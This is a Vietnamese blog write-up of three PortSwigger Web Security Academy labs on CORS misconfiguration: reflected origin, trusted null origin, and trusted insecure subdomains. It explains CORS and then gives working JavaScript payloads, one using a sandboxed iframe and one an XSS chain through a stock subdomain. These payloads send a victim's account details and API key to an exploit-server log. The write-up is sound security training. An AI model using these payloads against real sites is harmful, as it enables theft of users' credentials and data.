---
date: 2026-04-10T00:00:00+07:00
title: PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUp
categories: [pentesting, Web-Exploitation]
tags: [Web, PortSwigger]
---

# PortSwigger CORS (Cross-Origin Resource Sharing) challenge WriteUp

### Overview về CORS

#### CORS là gì? Vì sao lại xuất hiện
- CORS (Cross-Origin Resource Sharing) là một cơ chế bảo mật trong web cho phép các tài nguyên trên một máy chủ được chia sẻ với các trang web có nguồn (origin) khác. "Nguồn" ở đây được định nghĩa bởi ba yếu tố: giao thức (http, https), tên miền (domain), và cổng (port).

- Theo mặc định, các trình duyệt web tuân thủ Chính sách Cùng Nguồn Gốc (Same-Origin Policy - SOP). Chính sách này là một biện pháp bảo mật nền tảng, ngăn chặn một trang web từ nguồn A đọc dữ liệu từ một trang web ở nguồn B. Ví dụ, một script chạy trên https://your-bank.com không thể tự ý gửi yêu cầu đến https://evil-website.com và đọc phản hồi.

- Tuy nhiên, trong các ứng dụng web hiện đại, việc gọi API từ một tên miền khác, nhúng phông chữ, hoặc tải tài nguyên từ các mạng phân phối nội dung (CDN) là rất phổ biến. CORS ra đời để nới lỏng chính sách SOP một cách có kiểm soát, cho phép chia sẻ tài nguyên giữa các nguồn khác nhau một cách an toàn.

#### Cơ chế hoạt động của CORS

Cơ chế CORS hoạt động dựa trên việc trao đổi các HTTP header giữa trình duyệt và máy chủ:
- Khi một trang web (ví dụ https://client.com) muốn yêu cầu một tài nguyên từ một nguồn khác (ví dụ https://api.server.com/data), trình duyệt sẽ tự động thêm một HTTP header vào yêu cầu: Origin: https://client.com.
- Máy chủ api.server.com nhận được yêu cầu, nó sẽ kiểm tra giá trị của header Origin.
- Nếu máy chủ cho phép nguồn này truy cập, nó sẽ trả về một phản hồi kèm theo header Access-Control-Allow-Origin. Giá trị của header này có thể là nguồn đã yêu cầu (https://client.com) hoặc một dấu sao (*) để cho phép tất cả các nguồn.
- Trình duyệt nhận được phản hồi, kiểm tra header Access-Control-Allow-Origin. Nếu nguồn được cho phép, trình duyệt sẽ cho phép mã JavaScript của trang web đọc dữ liệu phản hồi. Ngược lại, nếu header này thiếu hoặc không khớp, trình duyệt sẽ chặn yêu cầu và báo lỗi CORS.

#### Có hai loại yêu cầu CORS chính:

- Yêu cầu đơn giản (Simple Request): Áp dụng cho các yêu cầu sử dụng phương thức GET, HEAD, POST và chỉ chứa các header đơn giản. Trình duyệt gửi thẳng yêu cầu và kiểm tra CORS ở phản hồi.
- Yêu cầu "phức tạp" (Preflight Request): Đối với các yêu cầu "phức tạp" hơn (ví dụ: sử dụng phương thức PUT, DELETE hoặc có các custom header), trình duyệt sẽ gửi trước một yêu cầu OPTIONS (gọi là "preflight request") để "hỏi" máy chủ xem yêu cầu chính thức có được phép hay không. Nếu máy chủ đồng ý, trình duyệt mới gửi yêu cầu thực sự.

#### Các lỗ hổng bảo mật CORS phổ biến

Lỗ hổng CORS xảy ra khi máy chủ được cấu hình sai, cho phép các nguồn không đáng tin cậy truy cập vào các tài nguyên nhạy cảm.

#### Cấu hình Access-Control-Allow-Origin quá rộng rãi đây là lỗi phổ biến và nguy hiểm nhất: 
- Access-Control-Allow-Origin: *: Cấu hình này cho phép bất kỳ trang web nào trên Internet gửi yêu cầu và đọc phản hồi từ máy chủ của bạn. Nếu tài nguyên trả về chứa thông tin nhạy cảm (như thông tin cá nhân người dùng, token API), kẻ tấn công có thể tạo một trang web độc hại để đánh cắp dữ liệu này.
- Phản chiếu động giá trị Origin: Một số nhà phát triển cấu hình máy chủ để đọc header Origin từ yêu cầu và phản chiếu lại giá trị đó trong Access-Control-Allow-Origin mà không kiểm tra. Điều này về cơ bản tương đương với việc dùng *, cho phép mọi nguồn truy cập.

#### Cấu hình sai Whitelist

- Đôi khi, logic kiểm tra danh sách các nguồn được phép có thể bị lỗi. Ví dụ, một trang web chỉ kiểm tra xem tên miền có kết thúc bằng trusted-site.com hay không. Kẻ tấn công có thể đăng ký một tên miền như malicious-trusted-site.com để vượt qua bộ lọc.

#### Lạm dụng Access-Control-Allow-Credentials: true

- Khi một yêu cầu cần gửi kèm thông tin xác thực (như cookie hoặc header Authorization), header Access-Control-Allow-Credentials phải được đặt là true. Nếu cấu hình này được kết hợp với một Access-Control-Allow-Origin quá rộng rãi, nó sẽ tạo ra một lỗ hổng nghiêm trọng, cho phép kẻ tấn công thực hiện các yêu cầu đã được xác thực thay mặt người dùng và đánh cắp dữ liệu nhạy cảm.

#### Lỗ hổng từ Origin: null

- Một số tình huống, chẳng hạn như khi mở một tệp HTML cục bộ, có thể tạo ra yêu cầu với Origin: null. Nếu máy chủ cho phép nguồn null này, nó có thể vô tình cho phép các tệp độc hại trên máy người dùng truy cập tài nguyên.

### Đi vào phân tích và giải từng lab

#### Lab: CORS vulnerability with basic origin reflection

```text 
This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter
```

Lab này bảo ta lấy API key của admin bằng code JS để exploit ở đây ta được cấp sẵn acc thường đó là `wiener:peter` bây giờ mình sẽ đăng nhập vào xem thử có những gì bên trong web này.

![image](https://hackmd.io/_uploads/HyvqRELxbx.png)

Ở đây sau khi đăng nhập ta sẽ được cấp một cái API key, ở đây là key của user wiener. 

![image](https://hackmd.io/_uploads/Sk6EeSUl-x.png)

Tại đây sau khi đăng nhập ta để ý rằng có một request GET thông tin chi tiết của account đăng nhập, response trả về cho ta đúng với GUI nhưng ở đây ta để ý ở trường `Access-Control-Allow-Credentials: true` ở response và trường `Sec-Fetch-Site: same-origin` ở request ở đây trong trường hợp này, một số application thường mở thêm access cho một số domain khác và nếu config và kiểm soát không đúng cách thì sẽ dính lỗi.

Ở đây mình sẽ thêm một trường nữa là Origin xem thử nó có reflect cái domain trở về trong response không để khẳng định.

![image](https://hackmd.io/_uploads/H1cubBUg-x.png)

Và kết quả như dự tính thì nó đã reflected cái domain trở về vì nó config lỗi như vậy nên kết quả là domain nào cũng đều có thể truy cập vào tài nguyên của con web app bị lỗi.

Bây giờ ta sẽ tạo code JS để exploit cái lỗi này.

```javascript 
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a310000045184f0817316af00340031.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

Các thành phần chính:

- Tạo XMLHttpRequest

```javascript 
var req = new XMLHttpRequest();
```

Đây là đối tượng dùng để gửi request HTTP từ trình duyệt.

- Mở request đến domain khác.

```javascript 
req.open('get','https://0a310000045184f0817316af00340031.web-security-academy.net/accountDetails',true);
Script gửi request GET đến endpoint /accountDetails của một website khác (ở đây là lab vulnerable).
```

- Gửi kèm cookie phiên của nạn nhân

```javascript
req.withCredentials = true;
```

Thuộc tính này buộc trình duyệt gửi cookie/session của người dùng hiện tại cùng với request cross-origin.


Sau khi đẩy exploit code lên thì ta sẽ truy cập vào server log để xem những request.

![image](https://hackmd.io/_uploads/Hk2SQBUlZl.png)

Ta thấy nó trả về một GET request với nội dung cùa đường dẫn `/accountDetails` bây giờ vì nó được URL encode nên ta chỉ cần decode nó ra để đọc được nội dung bên trong.

![image](https://hackmd.io/_uploads/SyzoQBIx-e.png)

Thành công lấy được API key của admin rồi thành công solve.


#### Lab: CORS vulnerability with trusted null origin

```text 
This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter
```

Với lab thứ 2 thì mọi thứ nhìn sẽ tương tự như bài lab đầu tiên nên ta đi thằng vào request `/accountDetails` luôn.

![image](https://hackmd.io/_uploads/rkyfeL8gZx.png)

Request nó cũng giống như lab trước và ở response vẫn có trường `Access-Control-Allow-Credentials: true` nên liệu nếu ta để vào một cái origin bừa nó có nhận không nhỉ.

![image](https://hackmd.io/_uploads/HkZCxI8xZe.png)

Ở đây ta gửi thêm 1 cái origin mình thêm là `adudu.com` thì có thể thấy ở phần response rằng cái origin nó không được reflect lại có vẻ như nó đã whitelist lại vậy nên ta sẽ thử với giá trị null xem sao.

![image](https://hackmd.io/_uploads/B1d_WLLl-x.png)

Ta có thể thấy với giá trị null thì nó trả cho ta trường `Access-Control-Allow-Origin: null` vậy là nó cho phép truy cập tài nguyên với giá trị của origin là null có nghĩa là server sẽ tin tưởng tất cả các request nào có `Origin: null`.

Vậy bây giờ ta có kịch bản tạo payload là: 

- Attacker tạo một trang chứa iframe sandbox hoặc data: URI.

- Trình duyệt gửi request đến server với Origin: null.

- Server phản hồi với Access-Control-Allow-Origin: null và Access-Control-Allow-Credentials: true.

- Trình duyệt cho phép script của attacker đọc dữ liệu nhạy cảm từ response.

- Dữ liệu bị rò rỉ sang domain của attacker.

```javascript 
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a8900670307b3d881b9fc1800bc00b3.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://exploit-0a6300b80320b356810dfbb301050042.exploit-server.net//log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

Đây là payload để khai thác lab trên bây giờ ném nó vào exploit server và gửi đến cho victim.

![image](https://hackmd.io/_uploads/B1d3rULgWg.png)

Truy cập vào access log ta thấy rằng victim đã click vào đường dẫn payload và nó trả về kết quả cho ta bây giờ URL decode nó ra.

![image](https://hackmd.io/_uploads/Bym-L8UxZl.png)

Thành công decode và lấy được admin API key.

![image](https://hackmd.io/_uploads/ryHXIUUlZg.png)

#### Lab: CORS vulnerability with trusted insecure protocols

```text
This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter
```

![image](https://hackmd.io/_uploads/Sk7aa-ve-l.png)

Ở đây ta vẫn có chức năng tương tự như 2 lab ở phía trước bây giờ đi sâu vào request mà ta khai thác từ nãy đến giờ.

![image](https://hackmd.io/_uploads/BkbBRbPx-x.png)

Ở request này ta để ý rằng vẫn còn trường `Access-Control-Allow-Credentials: true` thì nó vẫn sẽ còn CORS. Nghĩa là server cho phép chia sẻ cookie/phiên đăng nhập qua CORS. Bây giờ tiếp tục xem request.

![image](https://hackmd.io/_uploads/SybRCZPlZx.png)

Với origin là null giống bài trước thì ta có thể thấy rằng nó không reflect về chứng tỏ nó không cho phép truy cập bây giờ ta sẽ thử với domain khác.

![image](https://hackmd.io/_uploads/BkB4xGDx-l.png)

Ở đây tôi thử với subdomain tự chế từ domain chính thì nó lập tức reflect lại có nghĩa rằng bất kỳ subdomain nào (HTTP hoặc HTTPS) đều được phép truy cập.

![image](https://hackmd.io/_uploads/HyboZfPl-x.png)

Tiếp đó ta để ý rằng chức năng checkstock nó load bằng HTTP URL trên subdomain đó là `stock.0a0d00a3044b5d6780f503660034001a.web-security-academy.net` bên cạnh đó giá trị của productId còn bị dính XSS.

![image](https://hackmd.io/_uploads/Bk3ZMfvxWg.png)

![image](https://hackmd.io/_uploads/SymXMzPxbe.png)

Nó đã trả alert về nên nhờ 2 chỗ này ta hoàn toàn có thể lợi dụng để tấn công vào bây giờ ta có kịch bản cho thấy rằng server đã “allow” tất cả subdomain (cùng domain gốc), nên attacker lợi dụng một subdomain HTTP + XSS để vượt qua SOP (Same-Origin Policy) và đánh cắp dữ liệu. Bây giờ ta sẽ tạo script.

```javascript 
<script>
    document.location="http://stock.0a0d00a3044b5d6780f503660034001a.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a0d00a3044b5d6780f503660034001a.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0ad0005104f65d73807a02e80194003a.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

![image](https://hackmd.io/_uploads/SJV9VfvxZl.png)

Thành công bắt được log sau khi victim click vào bây giờ decode ra thôi.

![image](https://hackmd.io/_uploads/B1L0EGwlbx.png)

Lấy được API key của Administrator submit là solve.

![image](https://hackmd.io/_uploads/SJ3gSzve-l.png)

Solve thành công và đây cũng là lab cuối cùng của chuỗi CORS.

